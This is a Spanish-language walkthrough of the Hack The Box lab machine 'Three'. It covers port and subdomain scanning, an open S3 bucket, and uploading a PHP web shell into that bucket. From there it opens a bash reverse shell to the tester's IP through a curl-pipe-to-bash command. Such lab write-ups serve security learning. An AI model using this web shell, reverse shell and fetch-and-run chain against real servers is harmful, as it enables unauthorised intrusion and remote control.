# Three - HTB

## Reconocimiento
- nmap -sCV -p- -Pn 10.129.161.108 -> escaneamos al objetivo.
- Puertos abiertos -> 22 SSH -> 80 HTTP Apache -> dominio de objetivo de web mail@thetoppers.htb
- ffuf -u http://10.129.161.108/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -> fuzzeadita rica para ver que hay.
- index.php // y en la página vemos el dominio del mail
- Para buscar subdomiinos.

tgt_size=$(curl -s http://thetoppers.htb | wc -c)
ffuf -c \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-u http://thetoppers.htb \
-H "Host: FUZZ.thetoppers.htb" \
fs $tgt_size \
mc all

- Descubrimos el subdominio s3.thetoppers.htb -> procedemos a escanearlo nmap -sCV -p- -Pn s3.thetoppers.htb
- Hay dos puertos abiertos 22SSH -> 80 http ( Amazon s3 web service) Cloud Object Storage

- sudo apt install awscli para poder interactuar con el s3 bucket
- aws configure para usarlo antes y ponemos temp en todas.
- aws s3 ls para listar todos los buckets hosteados en nuestro caso como es local ->
- aws --endpoint=http://s3.thetoppers.htb s3 ls
- aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb -> para listar lo que hay dentro
- Vamos a copiar una shell de php para poder hacer RCE -> echo '<?php system($_GET["cmd"]); ?>' > shell.php
- aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb y lo copiamos al bucket ->
- ahora si hacemos http://thetoppers.htb/shell.php?cmd= COMANDO AQUÍ ejecuta código RCE.
- Finalmente vamos a hacer una reverse sherll para ganar interactividad con la maquina ( server )
- Creamos shell.sh -> #!/bin/bash bash -i >& /dev/tcp/10.10.14.173/1337 0>&1
- nc -nvlp 1337 -> abrimos nuestro puerto y nos ponemos a la escucha y que no haga resolución dns (verbose)

- Creamos el servidor local python3 -m http.server 8000 en el directorio con shell.sh para que el server pille el archivo de nuestro servidor web.

- Finalmente lanzamos -> http://thetoppers.htb/shell.php?cmd=curl 10.10.14.173:8000/shell.sh|bash
- Le dice descarga de mi maquina shell.sh y llevatela y luego ejecutalo desde bash.
